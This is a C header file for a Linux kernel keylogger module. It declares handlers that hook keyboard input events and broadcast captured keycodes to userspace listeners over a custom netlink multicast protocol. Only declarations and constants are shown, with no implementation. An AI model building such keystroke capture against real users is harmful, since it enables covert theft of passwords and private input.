#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/slab.h> 
#include <linux/netlink.h>
#include <net/sock.h>
#include <linux/skbuff.h> 

#define NETLINK_USER_PROTOCOL 31 // Custom Netlink protocol number for user-kernel communication.
#define NETLINK_MULTICAST_GROUP 1 // Multicast group ID for broadcasting key events.
#define KEY_PRESSED_STATE 1// Input subsystem value representing a key press down event.
#define KEY_REPEATED_STATE 2 // Input subsystem value representing a key repeat event (holding down a key).


extern struct sock *netlink_socket;

/**
 * @brief Broadcasts the captured keycode to userspace listeners.
 * @param keycode The raw input keycode captured from the keyboard.
 */
void send_keycode_to_user(unsigned int keycode);

/**
 * @brief Event handler triggered by input subsystem events.
 * @param handle The input handle associated with the device.
 * @param event_type The type of the input event.
 * @param event_code The specific code of the input event.
 * @param event_value The value/state of the input event.
 */
static void handle_keyboard_event(struct input_handle *handle, unsigned int event_type, unsigned int event_code, int event_value);

/**
 * @brief Callback invoked when a new input device is connected.
 * @param handler The input handler.
 * @param dev The input device being connected.
 * @param id The device ID information.
 * @return 0 on success, or a negative error code on failure.
 */
static int connect_keyboard_device(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id);

/**
 * @brief Callback invoked when an input device is disconnected.
 * @param handle The input handle to disconnect.
 */
static void disconnect_keyboard_device(struct input_handle *handle);

/**
 * @brief Module initialization function.
 * @return 0 on success, negative error code otherwise.
 */
int __init initialize_keylogger_module(void);

/**
 * @brief Module cleanup function.
 */
void __exit cleanup_keylogger_module(void);

#endif